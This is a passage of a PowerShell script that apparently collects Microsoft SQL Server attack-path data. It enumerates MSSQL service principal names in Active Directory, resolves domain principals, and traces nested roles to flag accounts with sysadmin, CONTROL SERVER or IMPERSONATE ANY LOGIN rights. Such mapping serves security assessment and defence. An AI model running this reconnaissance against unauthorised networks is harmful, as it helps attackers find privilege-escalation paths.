                    Name = if ($result.Properties["userprincipalname"].Count -gt 0) { $result.Properties["userprincipalname"][0] } elseif ($result.Properties["dnshostname"].Count -gt 0) { $result.Properties["dnshostname"][0] } else { $result.Properties["samaccountname"][0] }
                    DistinguishedName = $result.Properties["distinguishedname"][0]
                    DNSHostName = if ($result.Properties["dnshostname"].Count -gt 0) { $result.Properties["dnshostname"][0] } else { $null }
                    Domain = $Domain
                    Enabled = if ($result.Properties["useraccountcontrol"].Count -gt 0) { 
                        -not ([int]$result.Properties["useraccountcontrol"][0] -band 2) 
                    } else { 
                        $null 
                    }
                    IsDomainPrincipal = $true
                    SamAccountName = $result.Properties["samaccountname"][0]
                    SID = $objectSid
                    UserPrincipalName = if ($result.Properties["userprincipalname"].Count -gt 0) { $result.Properties["userprincipalname"][0] } else { $null }
                    Type = $objectClass.Substring(0,1).ToUpper() + $objectClass.Substring(1).ToLower()
                    Error = $null
                }
                
                $searcher.Dispose()
                return $returnResult
            }
            
            $searcher.Dispose()
            
        } catch {
            Write-Verbose "DirectorySearcher failed for '$Name' in domain '$Domain': $_"
        }
    }
    
    # Try NTAccount translation
    try {
        Write-Verbose "Attempting NTAccount translation for '$Name' in domain '$Domain'"
        
        # Try direct SID lookup
        $ntAccount = New-Object System.Security.Principal.NTAccount($Domain, $Name)
        $sid = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier])
        $resolvedSid = $sid.Value
        Write-Verbose "Resolved SID for '$Name' using NTAccount in '$Domain': $resolvedSid"
        
        return [PSCustomObject]@{
            Name = "$Domain\$Name"
            SID = $resolvedSid
            Domain = $Domain
            Error = $null
        }
    } catch {
        Write-Verbose "NTAccount translation failed for '$Name' in domain '$Domain': $_"
    }
    
    # Try SID to name translation as final attempt (if input looks like a SID)
    if ($Name -match "^S-\d+-\d+") {
        try {
            Write-Verbose "Attempting SID to name translation for '$Name'"
            $sid = New-Object System.Security.Principal.SecurityIdentifier($Name)
            $resolvedName = $sid.Translate([System.Security.Principal.NTAccount]).Value
            Write-Verbose "Resolved name for SID '$Name': $resolvedName"
            
            return [PSCustomObject]@{
                Name = $resolvedName
                SID = $Name
                Domain = $Domain
                Error = $null
            }
        } catch {
            Write-Verbose "SID to name translation failed for '$Name': $_"
        }
    }
    
    # Return failure
    return $null
}

function Resolve-DomainPrincipal {
    param (
        [string]$PrincipalName,
        [string[]]$AlternativeDomains = @()
    )
    
    # Parse principal name to extract base name
    $name = $PrincipalName
    if ($PrincipalName -match "\\") {
        $name = $PrincipalName.Split('\')[1]
    } elseif ($PrincipalName -match "@") {
        $name = $PrincipalName.Split('@')[0]
    } elseif ($PrincipalName -match "\.") {
        $name = $PrincipalName.Split('.')[0]
    }
    
    # Skip NT AUTHORITY principals
    if ($PrincipalName -match "^NT AUTHORITY\\") {
        Write-Verbose "Skipping non-domain principal $PrincipalName"
        return $null
    }
    
    # Get list of domains to try
    $domainsToTry = Get-DomainsToTry -PrincipalName $PrincipalName -AlternativeDomains $AlternativeDomains
    
    if ($domainsToTry.Count -eq 0) {
        Write-Verbose "No accessible domains found for '$PrincipalName'"
        return [PSCustomObject]@{
            Error = "No accessible domains found for '$PrincipalName'"
        }
    }

    # Try each domain until successful
    foreach ($domain in $domainsToTry) {
        Write-Verbose "Trying domain: $domain"
        
        $result = Resolve-PrincipalInDomain -Name $name -Domain $domain
        if ($result) {
            Write-Verbose "Successfully resolved '$PrincipalName' in domain '$domain'"
            return $result
        }
    }
    
    # If all domains failed, return error
    return [PSCustomObject]@{
        Error = "Failed to resolve '$PrincipalName' in any domain: $($domainsToTry -join ', ')"
    }
}

# Convert PSObjects to hashtables (for node properties)
function ConvertTo-Hashtable {
    param([Parameter(ValueFromPipeline)]$InputObject)
    
    $hashtable = @{}
    if ($InputObject) {
        $InputObject.PSObject.Properties | ForEach-Object {
            $hashtable[$_.Name] = $_.Value
        }
    }
    return $hashtable
}

# Helper function to convert a SID from hex to a SecurityIdentifier object
function ConvertTo-SecurityIdentifier {
    param (
        [string]$SidHex
    )
    
    try {
        if ([string]::IsNullOrEmpty($SidHex) -or $SidHex -eq "0x" -or $SidHex -eq "0x01") {
            return $null
        }
        
        if ($SidHex.StartsWith("0x")) {
            $SidHex = $SidHex.Substring(2)
        }
        
        # Check if hex string is valid (must be even length and at least 8 chars for minimal SID)
        if ($SidHex.Length % 2 -ne 0 -or $SidHex.Length -lt 8) {
            return $null
        }
        
        $bytes = New-Object byte[] ($SidHex.Length / 2)
        for ($i = 0; $i -lt $bytes.Length; $i++) {
            try {
                $bytes[$i] = [Convert]::ToByte($SidHex.Substring($i * 2, 2), 16)
            }
            catch {
                return $null
            }
        }
        
        # Validate SID structure before creating SecurityIdentifier
        if ($bytes.Length -lt 8 -or $bytes[0] -ne 1) {
            return $null
        }
        
        $sid = New-Object System.Security.Principal.SecurityIdentifier($bytes, 0)
        return $sid.Value
    }
    catch {
        Write-Verbose "Failed to convert SID hex '$SidHex': $_"
        return $null
    }
}

# Helper function to enumerate members of a local group using WMI (works remotely)
function Get-LocalGroupMembers {
    param (
        [string]$ComputerName,
        [string]$GroupName
    )
    
    $members = @()
    
    try {
        Write-Verbose "Attempting to enumerate members of $ComputerName\$GroupName using WMI"
        
        # Use WMI to get group members (works remotely)
        $query = "SELECT * FROM Win32_GroupUser WHERE GroupComponent=`"Win32_Group.Domain='$ComputerName',Name='$GroupName'`""
        $groupMembers = Get-CimInstance -Query $query -ComputerName $ComputerName -ErrorAction Stop
        
        Write-Verbose "Found $($groupMembers.Count) members in $GroupName"
        
        foreach ($member in $groupMembers) {
            # Parse the PartComponent to extract domain and name
            if ($member.PartComponent -match 'Domain="([^"]+)",Name="([^"]+)"') {
                $memberDomain = $matches[1]
                $memberName = $matches[2]
                
                # Skip local accounts and computer accounts from the same machine
                if ($memberDomain.ToUpper() -ne $ComputerName.ToUpper() -and 
                    $memberDomain.ToUpper() -ne "NT AUTHORITY" -and
                    $memberDomain.ToUpper() -ne "NT SERVICE") {
                    
                    $fullName = "$memberDomain\$memberName"
                    Write-Verbose "Found domain member: $fullName"

                    # Try to resolve the SID
                    $resolvedPrincipal = Resolve-DomainPrincipal $fullName

                    if (-not $resolvedPrincipal.Error) {
                        $members += $resolvedPrincipal
                    }
                }
            }
        }
    }
    catch {
        Write-Warning "WMI enumeration failed for $ComputerName\$GroupName. This may require remote WMI access permissions."
        Write-Verbose "WMI Error: $_"
    }
    
    Write-Verbose "Returning $($members.Count) domain members for $GroupName"
    return $members
}

function Get-MSSQLServerFromString {
    param (
        [string]$Server,
        [string]$DomainName = $script:Domain
    )

    # Specify SPN
    if ($Server -match '^MSSQLSvc/([^:]+)(:(.+))?$') {
        $hostPart = $matches[1]
        $portOrInstance = if ($matches[3]) { $matches[3] } else { "1433" }  # Default to 1433 if no port specified            
    # Specify name:[port|instance]
    } elseif ($Server -match '([^:]+)(:(.+))?$') {
        $hostPart = $matches[1]
        $portOrInstance = if ($matches[3]) { $matches[3] } else { "1433" }  # Default to 1433 if no port specified            
    }

    # Resolve host to domain SID
    $hostSid = $null
    try {
        # Try to resolve as computer account
        $computer = Resolve-DomainPrincipal $hostPart
    
        if ($computer.SID) {
            $hostSid = $computer.SID
        } else {
            Write-Warning "No SID found for $hostPart"
        }

    }
    catch {
        Write-Warning "Error resolving host in domain $DomainName '$hostPart': $_"
        continue
    }
    
    if ($hostSid) {
        # Create ObjectIdentifier
        $objectIdentifier = "${hostSid}:${portOrInstance}"
        
        # Create or update server object
        if (-not $script:serversToProcess.ContainsKey($objectIdentifier)) {
            $script:serversToProcess[$objectIdentifier] = [PSCustomObject]@{
                ObjectIdentifier = $objectIdentifier
                ServerName = $hostPart
                Port = if ($portOrInstance -match '^\d+$') { $portOrInstance } else { 1433 }
                InstanceName = if ($portOrInstance -match '^\d+$') { $null } else { $portOrInstance }
                ServiceAccountSIDs = @()
                ServicePrincipalNames = @()
                ServerFullName = "$($hostPart):$(if ($portOrInstance) { $portOrInstance } else { 1433 })"
            }
        } else {
            # Update ServerName to prefer FQDN
            $currentServerName = $script:serversToProcess[$objectIdentifier].ServerName
            
            # If current name is short (no dots) and new name is FQDN (has dots), update it
            if ($currentServerName -notmatch '\.' -and $hostPart -match '\.') {
                $script:serversToProcess[$objectIdentifier].ServerName = $hostPart
                Write-Verbose "Updated ServerName from '$currentServerName' to FQDN '$hostPart'"
            }
            # If both are FQDNs or both are short names, keep the first one found
        }
        
        # Add service account if not already present
        $existingServiceAccount = $script:serversToProcess[$objectIdentifier].ServiceAccountSIDs | Where-Object { $_.ObjectIdentifier -eq $serviceAccountSid }
        if (-not $existingServiceAccount) {
            $script:serversToProcess[$objectIdentifier].ServiceAccountSIDs += [PSCustomObject]@{
                Name = $serviceAccountName
                ObjectIdentifier = $serviceAccountSid
            }
        }
        
        # Add SPN if not already present
        if ($spn -notin $script:serversToProcess[$objectIdentifier].ServicePrincipalNames) {
            $script:serversToProcess[$objectIdentifier].ServicePrincipalNames += $spn
        }
    }
}

function Parse-ServerListEntry {
    param(
        [string]$Entry
    )
    
    # Trim whitespace
    $Entry = $Entry.Trim()
    
    # Skip empty lines and comments
    if ([string]::IsNullOrWhiteSpace($Entry) -or $Entry.StartsWith('#')) {
        return
    }
    
    # Parse the server entry and add to processing queue
    Get-MSSQLServerFromString -Server $Entry
}

# Function to collect MSSQL SPNs from Active Directory
function Get-MSSQLServersFromSPNs {
    param (
        [string]$DomainName = $script:Domain
    )
        
    try {
        Write-Host "Collecting MSSQL SPNs from Active Directory..." -ForegroundColor Cyan
        
        # Search for all objects with MSSQLSvc SPNs
        $searcher = [adsisearcher]"(servicePrincipalName=MSSQLSvc/*)"
        if ($DomainName) {
            $searcher.SearchRoot = [adsi]"LDAP://$DomainName"
        }
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.AddRange(@('servicePrincipalName', 'distinguishedName', 'objectSid', 'samAccountName'))
        
        $results = $searcher.FindAll()
        
        Write-Host "`nFound $($results.Count) principals with MSSQLSvc SPNs:" -ForegroundColor Cyan
        
        foreach ($result in $results) {
            $serviceAccountSid = (New-Object System.Security.Principal.SecurityIdentifier($result.Properties['objectsid'][0], 0)).Value
            $serviceAccountName = "$DomainName\$($result.Properties['samaccountname'][0])"
            
            # Print principal info
            Write-Host "`nPrincipal: $serviceAccountName (SID: $serviceAccountSid)" -ForegroundColor Cyan
            
            # Print all SPNs for this principal
            $mssqlSpns = $result.Properties['serviceprincipalname'] | Where-Object { $_ -like 'MSSQLSvc/*' }
            Write-Host "  MSSQLSvc SPNs:"
            foreach ($spn in $mssqlSpns) {
                Write-Host "    - $spn"
            }
            
            foreach ($spn in $result.Properties['serviceprincipalname']) {
                if ($spn -match '^MSSQLSvc/([^:]+)(:(.+))?$') {
                    Get-MSSQLServerFromString -Server $spn
                }
            }
        }
        
        Write-Host "Found $($script:serversToProcess.Count) MSSQL Server instances from SPNs"
        Write-Host "`nExtracted SQL Servers from SPNs:" -ForegroundColor Cyan
        foreach ($server in $script:serversToProcess.Values) {
            Write-Host "`nServer: $($server.ServerName)" -ForegroundColor Cyan
            Write-Host "  ObjectIdentifier: $($server.ObjectIdentifier)"
            Write-Host "  Instance: $(if ($server.InstanceName) { $server.InstanceName } else { 'Default (port-based)' })"
            Write-Host "  Service Accounts:"
            foreach ($sa in $server.ServiceAccountSIDs) {
                Write-Host "    - $($sa.Name) ($($sa.ObjectIdentifier))"
            }
            Write-Host "  SPNs:"
            foreach ($spn in $server.ServicePrincipalNames) {
                Write-Host "    - $spn"
            }
        }
    }
    catch {
        Write-Error "Error collecting MSSQL SPNs: $_"
        return @()
    }
}

function Get-NestedRoleMembership {
    param(
        [Parameter(Mandatory=$true)]
        $Principal,
        [Parameter(Mandatory=$true)]
        [string]$TargetRoleName,
        [Parameter(Mandatory=$false)]
        $Database = $null,
        [Parameter(Mandatory=$false)]
        [System.Collections.Generic.HashSet[string]]$VisitedRoles = (New-Object System.Collections.Generic.HashSet[string]),
        [Parameter(Mandatory=$false)]
        $ServerInfo = $null  # Contains ServerPrincipals array for server-level checks
    )
    
    # Loop through each role the principal is directly a member of
    foreach ($role in $Principal.MemberOf) {
        # Extract role name - handles both simple Name property and ObjectIdentifier format
        # ObjectIdentifier format is like "rolename@server" so we split and take first part
        $roleName = if ($role.PSObject.Properties.Name -contains "Name") {
            $role.Name
        } else {
            $objIdParts = $role.ObjectIdentifier -split '@'
            if ($objIdParts.Count -gt 0) { $objIdParts[0] }
        }
        
        # Create a unique key that includes database context to prevent confusion 
        # between same-named roles in different databases
        $roleKey = if ($Database) { "$($Database.Name)::$roleName" } else { "Server::$roleName" }
        
        # Skip if we've already checked this role - prevents infinite loops
        # Example: RoleA -> RoleB -> RoleC -> RoleA would loop forever without this
        if ($VisitedRoles.Contains($roleKey)) {
            continue
        }
        $VisitedRoles.Add($roleKey) | Out-Null
        
        # Found our target role! Return true immediately
        if ($roleName -eq $TargetRoleName) {
            return $true
        }
        
        # This role isn't our target, but maybe our target is nested inside it
        # So we need to check this role's memberships recursively
        try {
            $roleObj = $null
            
            if ($Database) {
                # For database roles, look in the database's Roles collection
                $roleObj = $Database.Roles | Where-Object { $_.Name -eq $roleName }
            } elseif ($ServerInfo) {
                # For server roles, look in ServerPrincipals for role types
                # Both logins and roles are principals at the server level
                $roleObj = $ServerInfo.ServerPrincipals | Where-Object { 
                    $_.Name -eq $roleName -and $_.TypeDescription -like "*ROLE*" 
                }
            }
            
            # If we found the role and it has memberships, check them recursively
            if ($roleObj -and $roleObj.PSObject.Properties.Name -contains "MemberOf" -and $roleObj.MemberOf) {
                # Pass the same VisitedRoles set to maintain loop prevention across all recursion levels
                $isNested = Get-NestedRoleMembership -Principal $roleObj -TargetRoleName $TargetRoleName -VisitedRoles $VisitedRoles -Database $Database -ServerInfo $ServerInfo
                if ($isNested) {
                    return $true
                }
            }
        } catch {
            # Don't fail the whole check if one role lookup fails - just log and continue
            Write-Verbose "Error checking nested role membership for ${roleName}: $($_)"
        }
    }
    
    # Checked all paths and didn't find the target role
    return $false
}

function Get-EffectivePermissions {
    param(
        [Parameter(Mandatory=$true)]
        $Principal,
        [Parameter(Mandatory=$true)]
        [string]$TargetPermission,
        [Parameter(Mandatory=$false)]
        $Database = $null,
        [Parameter(Mandatory=$false)]
        $ServerInfo = $null  # Contains ServerPrincipals array for server-level checks
    )
    
    # First check if the principal has the permission directly granted
    # This is the simplest case - no role membership needed
    foreach ($perm in $Principal.Permissions) {
        if ($perm.Permission -eq $TargetPermission) {
            return $true
        }
    }
    
    # Permission not found directly, so check all roles (and their nested roles)
    # Using HashSet for O(1) lookups when checking if we've seen a role before
    $checkedRoles = (New-Object System.Collections.Generic.HashSet[string])
    
    # Using Queue for breadth-first search through role hierarchy
    # This ensures we check all roles at each level before going deeper
    $rolesToCheck = New-Object System.Collections.Queue
    
    # Start by queuing all roles the principal is directly a member of
    foreach ($role in $Principal.MemberOf) {
        # Extract role name using same logic as Get-NestedRoleMembership
        $roleName = if ($role.PSObject.Properties.Name -contains "Name") {
            $role.Name
        } else {
            $objIdParts = $role.ObjectIdentifier -split '@'
            if ($objIdParts.Count -gt 0) { $objIdParts[0] }
        }
        $rolesToCheck.Enqueue($roleName)
    }
    
    # Process roles one at a time, adding any nested roles we find to the queue
    while ($rolesToCheck.Count -gt 0) {
        $currentRoleName = $rolesToCheck.Dequeue()
        
        # Create unique key including database context
        $roleKey = if ($Database) { "$($Database.Name)::$currentRoleName" } else { "Server::$currentRoleName" }
        
        # Skip if already checked - prevents infinite loops and redundant work
        if ($checkedRoles.Contains($roleKey)) {
            continue
        }
        $checkedRoles.Add($roleKey) | Out-Null
        
        # Skip the 'public' role - it's implicit and won't have permissions we care about
        if ($currentRoleName -eq "public") {
            continue
        }
        
        try {
            # Find the actual role object so we can check its permissions and memberships
            $roleObj = $null
            if ($Database) {
                # For database roles, look in the database's Roles collection
                $roleObj = $Database.Roles | Where-Object { $_.Name -eq $currentRoleName }
            } elseif ($ServerInfo) {
                # For server roles, look in ServerPrincipals for role types
                $roleObj = $ServerInfo.ServerPrincipals | Where-Object { 
                    $_.Name -eq $currentRoleName -and $_.TypeDescription -like "*ROLE*" 
                }
            }
            
            if ($roleObj) {
                # Check if this role has the permission we're looking for
                # Some roles might not have a Permissions property, so we check first
                if ($roleObj.PSObject.Properties.Name -contains "Permissions") {
                    foreach ($perm in $roleObj.Permissions) {
                        if ($perm.Permission -eq $TargetPermission) {
                            # Found it! The principal has this permission through role membership
                            return $true
                        }
                    }
                }
                
                # This role doesn't have the permission, but maybe a role it's a member of does
                # Add any nested roles to our queue to check later
                if ($roleObj.PSObject.Properties.Name -contains "MemberOf") {
                    foreach ($nestedRole in $roleObj.MemberOf) {
                        # Extract nested role name using same logic
                        $nestedRoleName = if ($nestedRole.PSObject.Properties.Name -contains "Name") {
                            $nestedRole.Name
                        } else {
                            $objIdParts = $nestedRole.ObjectIdentifier -split '@'
                            if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                        }
                        # Add to queue for later processing - maintains breadth-first approach
                        $rolesToCheck.Enqueue($nestedRoleName)
                    }
                }
            }
        } catch {
            # Don't fail entire permission check if one role lookup fails
            Write-Verbose "Error checking permissions for role ${currentRoleName}: $($_)"
        }
    }
    
    # Checked all roles and nested roles - permission not found
    return $false
}

# Unified function to process SQL principals (server or database)
function Process-SQLPrincipals {
    param (
        # Required parameters
        [Parameter(Mandatory=$true)]
        [System.Data.DataSet]$PrincipalsTable,
        
        [Parameter(Mandatory=$true)]
        [hashtable]$MembershipsByPrincipal,
        
        [Parameter(Mandatory=$true)]
        [hashtable]$ExplicitPermissions,
        
        [Parameter(Mandatory=$true)]
        [string]$ObjectIdentifierBase,
        
        # Optional parameters with defaults
        [Parameter(Mandatory=$false)]
        [hashtable]$FixedRolePermissions = @{},
        
        [Parameter(Mandatory=$false)]
        [hashtable]$PrincipalObjectIds = @{},

        [Parameter(Mandatory=$false)]
        [hashtable]$MembersByRole = @{},        
        
        [Parameter(Mandatory=$false)]
        [string]$PrincipalLevel = "Server", # "Server" or "Database"
        
        [Parameter(Mandatory=$false)]
        [string]$DatabaseName = "",
        
        [Parameter(Mandatory=$false)]
        [System.Data.SqlClient.SqlConnection]$Connection = $null,
        
        [Parameter(Mandatory=$false)]
        [PSObject[]]$ExistingPrincipals = @(),

        [Parameter(Mandatory=$false)]
        [hashtable]$PrincipalCredentialMap = @{}
    )
    
    $principals = @()
    $domainPrincipalsWithControlServer = @()
    $domainPrincipalsWithImpersonateAnyLogin = @()
    $domainPrincipalsWithSecurityAdmin = @()
    $domainPrincipalsWithSysadmin = @()
    $domainPrincipalHasSysadmin = $false
    
    # Process each principal
    foreach ($row in $PrincipalsTable.Tables[0].Rows) {
        $principalName = $row["Name"].ToString()
        $principalType = $row["TypeDescription"].ToString()
        $principalID = $row["PrincipalID"].ToString()
        $isFixedRole = $row["IsFixedRole"].ToString() -eq "1"
        
        # Create the ObjectIdentifier for this principal
        $principalObjectId = if ($PrincipalLevel -eq "Server") {
            "$principalName@$ObjectIdentifierBase"
        } else {
            "$principalName@$ObjectIdentifierBase\$DatabaseName"
        }
        
        # Create an object for this principal
        $principal = New-Object PSObject

        # Add credential information if principal uses a credential
        if ($principalCredentialMap.ContainsKey($principalID)) {
            $principal | Add-Member -MemberType NoteProperty -Name "HasCredential" -Value $principalCredentialMap[$principalID]
        } else {
            $principal | Add-Member -MemberType NoteProperty -Name "HasCredential" -Value $null
        }
        
        # Add common properties for all principals
        $principal | Add-Member -MemberType NoteProperty -Name "ObjectIdentifier" -Value $principalObjectId
        $principal | Add-Member -MemberType NoteProperty -Name "CreateDate" -Value $row["CreateDate"].ToString()
        $principal | Add-Member -MemberType NoteProperty -Name "IsFixedRole" -Value $(if ($isFixedRole) { "1" } else { "0" })
        $principal | Add-Member -MemberType NoteProperty -Name "ModifyDate" -Value $row["ModifyDate"].ToString()
        $principal | Add-Member -MemberType NoteProperty -Name "Name" -Value $principalName
        $principal | Add-Member -MemberType NoteProperty -Name "OwningPrincipalID" -Value $row["OwningPrincipalID"].ToString()
        $principal | Add-Member -MemberType NoteProperty -Name "PrincipalID" -Value $principalID
        $principal | Add-Member -MemberType NoteProperty -Name "SQLServerID" -Value $serverInfo.ObjectIdentifier
        $principal | Add-Member -MemberType NoteProperty -Name "SQLServerName" -Value $serverInfo.Name
        $principal | Add-Member -MemberType NoteProperty -Name "SID" -Value $row["SID"].ToString()
        $principal | Add-Member -MemberType NoteProperty -Name "Type" -Value $row["Type"].ToString()
        $principal | Add-Member -MemberType NoteProperty -Name "TypeDescription" -Value $principalType
        
        # Add IsActiveDirectoryPrincipal if it exists in the row
        if ($row.Table.Columns.Contains("IsActiveDirectoryPrincipal") -and -not [System.DBNull]::Value.Equals($row["IsActiveDirectoryPrincipal"])) {
            $principal | Add-Member -MemberType NoteProperty -Name "IsActiveDirectoryPrincipal" -Value $row["IsActiveDirectoryPrincipal"].ToString()
        }
        
        # Add level-specific properties
        if ($PrincipalLevel -eq "Server") {
            # Server-specific properties
            $principal | Add-Member -MemberType NoteProperty -Name "DefaultDatabaseName" -Value $row["DefaultDatabaseName"].ToString()
            $principal | Add-Member -MemberType NoteProperty -Name "IsDisabled" -Value $row["IsDisabled"].ToString()
        } else {
            # Database-specific properties
            $principal | Add-Member -MemberType NoteProperty -Name "DefaultSchemaName" -Value $row["DefaultSchemaName"].ToString()
        }
        
        # Add OwningObjectIdentifier based on OwningPrincipalID
        if ($principal.OwningPrincipalID -and $principal.OwningPrincipalID -ne '') {
            # Try to find owner in existing principals first
            $ownerPrincipal = $ExistingPrincipals | Where-Object {
                $_.PrincipalID -eq $principal.OwningPrincipalID
            } | Select-Object -First 1
        
            if ($ownerPrincipal) {
                $principal | Add-Member -MemberType NoteProperty -Name "OwningObjectIdentifier" -Value $ownerPrincipal.ObjectIdentifier
                # Add OwningPrincipalType when we find the owner
                $principal | Add-Member -MemberType NoteProperty -Name "OwningPrincipalType" -Value $ownerPrincipal.TypeDescription
            } else {
                # Use lookup table to find owner
                if ($PrincipalObjectIds.ContainsKey($principal.OwningPrincipalID)) {
                    $principal | Add-Member -MemberType NoteProperty -Name "OwningObjectIdentifier" -Value $PrincipalObjectIds[$principal.OwningPrincipalID]
                } else {
                    # If not found but we have the ID, create a placeholder
                    if ($PrincipalLevel -eq "Server") {
                        $principal | Add-Member -MemberType NoteProperty -Name "OwningObjectIdentifier" -Value "UnknownOwner-$($principal.OwningPrincipalID)@$ObjectIdentifierBase"
                    } else {
                        $principal | Add-Member -MemberType NoteProperty -Name "OwningObjectIdentifier" -Value "UnknownOwner-$($principal.OwningPrincipalID)@$ObjectIdentifierBase\$DatabaseName"
                    }
                }
                
                # Try to find type in the principals table since we didn't find it in ExistingPrincipals
                $ownerRow = $PrincipalsTable.Tables[0].Rows | Where-Object { 
                    $_.PrincipalID -eq $principal.OwningPrincipalID 
                } | Select-Object -First 1
                
                if ($ownerRow) {
                    $principal | Add-Member -MemberType NoteProperty -Name "OwningPrincipalType" -Value $ownerRow.TypeDescription
                } else {
                    $principal | Add-Member -MemberType NoteProperty -Name "OwningPrincipalType" -Value $null
                }
            }
        } else {
            $principal | Add-Member -MemberType NoteProperty -Name "OwningObjectIdentifier" -Value $null
            $principal | Add-Member -MemberType NoteProperty -Name "OwningPrincipalType" -Value $null
        }
                
        # Get direct role memberships for this principal
        $memberOf = @()
        if ($MembershipsByPrincipal.ContainsKey($principalID)) {
            $memberOf = $MembershipsByPrincipal[$principalID]
        }

        # Add public role membership for all logins (server level)
        if ($PrincipalLevel -eq "Server" -and $principalType -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {
            # Check if already a member of public
            $isPublicMember = $false
            foreach ($role in $memberOf) {
                $roleName = if ($role.PSObject.Properties.Name -contains "Name") { 
                    $role.Name 
                } else {
                    $objIdParts = $role.ObjectIdentifier -split '@'
                    if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                }
                
                if ($roleName -eq "public") {
                    $isPublicMember = $true
                    break
                }
            }
            
            # If not already a member, add public role
            if (-not $isPublicMember) {
                $publicRoleObjectId = "public@$ObjectIdentifierBase"
                $memberOf += [PSCustomObject]@{
                    PrincipalID = "2" # public role always has principal_id = 2 in SQL Server
                    ObjectIdentifier = $publicRoleObjectId
                    TypeDescription = "SERVER_ROLE"
                }
            }
        }

        # Add public role membership for all database users (database level)
        if ($PrincipalLevel -eq "Database" -and $principalType -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
            # Check if already a member of public
            $isPublicMember = $false
            foreach ($role in $memberOf) {
                $roleName = if ($role.PSObject.Properties.Name -contains "Name") { 
                    $role.Name 
                } else {
                    $objIdParts = $role.ObjectIdentifier -split '@'
                    if ($objIdParts.Count -gt 0) { $objIdParts[0] } else { $null }
                }
                
                if ($roleName -eq "public") {
                    $isPublicMember = $true
                    break
                }
            }
            
            # If not already a member, add public role
            if (-not $isPublicMember) {
                $publicRoleObjectId = "public@$ObjectIdentifierBase\$DatabaseName"
                $memberOf += [PSCustomObject]@{
                    PrincipalID = "0" # public role always has principal_id = 0 in databases
                    ObjectIdentifier = $publicRoleObjectId
                    TypeDescription = "DATABASE_ROLE"
                }
            }
        }

        # Check if this is a domain principal with sysadmin role (server level only)
        if ($PrincipalLevel -eq "Server") {
            # Get IsActiveDirectoryPrincipal value
            $isAdPrincipal = $false
            if ($principal.PSObject.Properties.Name -contains "IsActiveDirectoryPrincipal") {
                $isAdPrincipal = $principal.IsActiveDirectoryPrincipal -eq "1"
            }
            
            if ($isAdPrincipal) {
                foreach ($role in $memberOf) {
                    # Check for sysadmin or securityadmin roles which can grant themselves high privileges
                    $roleName = $null
                    if ($role.PSObject.Properties.Name -contains "Name") { 
                        $roleName = $role.Name 
                    } else { 
                        # Extract name from ObjectIdentifier
                        $objIdParts = $role.ObjectIdentifier -split '@'
                        if ($objIdParts.Count -gt 0) {
                            $roleName = $objIdParts[0]
                        }
                    }
                    
                    if ($roleName -eq "securityadmin") {
                        $domainPrincipalHasSysadmin = $true
                        $domainPrincipalsWithSecurityAdmin += $principal.ObjectIdentifier
                        break
                    } elseif ($roleName -eq "sysadmin") {
                        $domainPrincipalHasSysadmin = $true
                        $domainPrincipalsWithSysadmin += $principal.ObjectIdentifier
                        break
                    }
                }
            }
        }
        
        # Always add MemberOf property, even if empty
        $principal | Add-Member -MemberType NoteProperty -Name "MemberOf" -Value $memberOf
            
        # Initialize permissions list
        $permsList = @()
        
        # Add explicit permissions if any exist
        if ($ExplicitPermissions.ContainsKey($principalID)) {
            foreach ($permKey in $ExplicitPermissions[$principalID].Keys) {
                $permInfo = $ExplicitPermissions[$principalID][$permKey]
                $permission = $permInfo.Permission  # Get the actual permission name
                
                # Filter for permissions we want to track
                $permissionsToCheck = if ($PrincipalLevel -eq "Server") { $ServerPermissionsToMap } else { $DatabasePermissionsToMap }
                if (-not ($permission -in $permissionsToCheck)) {
                    continue  # Skip permissions not in our mapping list
                }
                
                # Create a permission object with all available properties
                $permObject = [PSCustomObject]@{
                    ClassDesc = $permInfo.ClassDesc
                    Class = $permInfo.ClassValue  # This keeps the raw integer value
                    Permission = $permission
                    State = $permInfo.State
                    MajorID = $permInfo.MajorID
                }
                
                # If this permission targets another principal (class 101 for server, class 4 for database), resolve its ObjectIdentifier
                if (($PrincipalLevel -eq "Server" -and $permInfo.ClassValue -eq "101" -and $permInfo.MajorID -ne "0") -or
                    ($PrincipalLevel -eq "Database" -and $permInfo.ClassValue -eq "4" -and $permInfo.MajorID -ne "0")) {
                    # This is a permission on a specific principal
                    if ($PrincipalObjectIds.ContainsKey($permInfo.MajorID)) {
                        $targetObjectId = $PrincipalObjectIds[$permInfo.MajorID]
                        $permObject | Add-Member -MemberType NoteProperty -Name "TargetObjectIdentifier" -Value $targetObjectId
                    }
                }
                # For server/database-level permissions, target is the server/database itself
                elseif (($PrincipalLevel -eq "Server" -and $permInfo.ClassDesc -eq "SERVER") -or
                        ($PrincipalLevel -eq "Database" -and $permInfo.ClassDesc -eq "DATABASE")) {
                    if ($PrincipalLevel -eq "Server") {
                        $permObject | Add-Member -MemberType NoteProperty -Name "TargetObjectIdentifier" -Value $ObjectIdentifierBase
                    } else {
                        $permObject | Add-Member -MemberType NoteProperty -Name "TargetObjectIdentifier" -Value "$ObjectIdentifierBase\$DatabaseName"
                    }
                }
                
                # Add to permissions list
                $permsList += $permObject
                
                # Check if domain principal has DBA-like permissions (server level only)
                if ($PrincipalLevel -eq "Server") {
                    # Get IsActiveDirectoryPrincipal value
                    $isAdPrincipal = $false
                    if ($principal.PSObject.Properties.Name -contains "IsActiveDirectoryPrincipal") {
                        $isAdPrincipal = $principal.IsActiveDirectoryPrincipal -eq "1"
                    }
                    
                    if ($isAdPrincipal) {
                        if ($permission -eq "CONTROL SERVER") {
                            $domainPrincipalHasSysadmin = $true
                            $domainPrincipalsWithControlServer += $principal.ObjectIdentifier
                        } elseif ($permission -eq "IMPERSONATE ANY LOGIN") {
                            $domainPrincipalHasSysadmin = $true
                            $domainPrincipalsWithImpersonateAnyLogin += $principal.ObjectIdentifier
                        }
                    } 
                }
            }
        }
        
        # Add predefined permissions for fixed roles
        if ($isFixedRole -and $FixedRolePermissions.ContainsKey($principalName)) {
            foreach ($permission in $FixedRolePermissions[$principalName]) {
                # Filter for permissions we want to track
                $permissionsToCheck = if ($PrincipalLevel -eq "Server") { $ServerPermissionsToMap } else { $DatabasePermissionsToMap }
                if (-not ($permission -in $permissionsToCheck)) {
